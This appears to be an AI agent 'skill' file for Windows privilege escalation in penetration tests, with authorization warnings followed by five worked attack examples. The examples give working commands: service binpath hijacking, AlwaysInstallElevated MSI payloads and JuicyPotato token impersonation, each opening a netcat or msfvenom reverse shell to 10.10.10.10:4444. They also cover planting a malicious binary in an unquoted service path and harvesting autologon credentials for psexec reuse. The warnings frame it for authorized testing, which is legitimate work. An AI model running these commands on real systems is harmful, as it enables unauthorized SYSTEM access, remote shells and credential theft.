---
name: windows-privilege-escalation
description: "Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Windows Privilege Escalation

## Detailed Guide

Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.

## Constraints and Limitations

### Operational Boundaries
- Kernel exploits may cause system instability
- Some exploits require specific Windows versions
- AV/EDR may detect and block common tools
- Token impersonation requires service account context
- Some techniques require GUI access

### Detection Considerations
- Credential dumping triggers security alerts
- Service modification logged in Event Logs
- PowerShell execution may be monitored
- Known exploit signatures detected by AV

### Legal Requirements
- Only test systems with written authorization
- Document all escalation attempts
- Avoid disrupting production systems
- Report all findings through proper channels

## Examples

### Example 1: Service Binary Path Exploitation
```powershell
# Find vulnerable service
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Result: RW MyService SERVICE_ALL_ACCESS

# Check current config
sc qc MyService

# Stop service and change binary path
sc stop MyService
sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService

# Catch shell as SYSTEM
```

### Example 2: AlwaysInstallElevated Exploitation
```powershell
# Verify vulnerability
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both return: 0x1

# Generate payload (attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi

# Transfer and execute
msiexec /quiet /qn /i C:\Users\Public\shell.msi

# Catch SYSTEM shell
```

### Example 3: JuicyPotato Token Impersonation
```powershell
# Verify SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Enabled

# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Catch SYSTEM shell
```

### Example 4: Unquoted Service Path
```powershell
# Find unquoted path
wmic service get name,pathname | findstr /i /v """
# Result: C:\Program Files\Vuln App\service.exe

# Check write permissions
icacls "C:\Program Files\Vuln App"
# Result: Users:(W)

# Place malicious binary
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# Restart service
sc stop "Vuln App"
sc start "Vuln App"
```

### Example 5: Credential Harvesting from Registry
```powershell
# Check for auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# Use credentials
runas /user:Administrator cmd.exe
# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
